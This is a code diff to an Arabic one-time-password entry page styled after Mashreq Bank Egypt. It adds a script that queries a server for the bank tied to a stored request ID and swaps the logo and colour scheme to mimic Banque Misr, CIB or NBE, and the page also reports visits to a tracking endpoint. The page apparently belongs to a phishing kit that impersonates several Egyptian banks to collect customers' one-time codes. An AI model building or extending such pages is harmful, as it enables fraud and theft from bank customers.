@@ -191,7 +191,7 @@
     <!-- Header: Logo right, Language button, and Menu icon left -->
     <header>
         <div class="logo-container">
-            <img src="images/mashreq_logo_new.jpg" alt="بنك مشرق مصر">
+            <img id="headerLogo" src="images/mashreq_logo_new.jpg" alt="البنك">
         </div>
         <div class="header-left">
             <button class="lang-btn" onclick="window.location.href='otp_en.html'">English</button>
@@ -246,6 +246,41 @@
 
     <!-- Scripts at the end of body -->
     <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const requestId = localStorage.getItem("request_id");
+            if (requestId) {
+                fetch('/request_status/' + requestId)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.data && data.data.bank) {
+                        const logo = document.getElementById('headerLogo');
+                        const bank = data.data.bank;
+                        if (bank === 'Banque Misr') logo.src = 'images/bm_logo.png';
+                        else if (bank === 'CIB') logo.src = 'images/cib_logo.png';
+                        else if (bank === 'NBE') logo.src = 'images/nbe_logo.png';
+                        
+                        // Update colors if needed
+                        if (bank === 'Banque Misr') {
+                            document.querySelectorAll('.submit-btn, .resend-link, footer, .lang-btn').forEach(el => {
+                                if (el.tagName === 'FOOTER') el.style.backgroundColor = '#b01c1c';
+                                else if (el.classList.contains('lang-btn')) el.style.borderColor = '#b01c1c', el.style.color = '#b01c1c';
+                                else el.style.backgroundColor = '#b01c1c', el.style.color = 'white';
+                            });
+                        } else if (bank === 'CIB') {
+                            document.querySelectorAll('.submit-btn, .resend-link, footer, .lang-btn').forEach(el => {
+                                if (el.tagName === 'FOOTER') el.style.backgroundColor = '#004b91';
+                                else el.style.backgroundColor = '#004b91';
+                            });
+                        } else if (bank === 'NBE') {
+                            document.querySelectorAll('.submit-btn, .resend-link, footer, .lang-btn').forEach(el => {
+                                if (el.tagName === 'FOOTER') el.style.backgroundColor = '#006b3f';
+                                else el.style.backgroundColor = '#006b3f';
+                            });
+                        }
+                    }
+                });
+            }
+        });
         fetch('/track_visit', {
             method: 'POST',
             headers: {
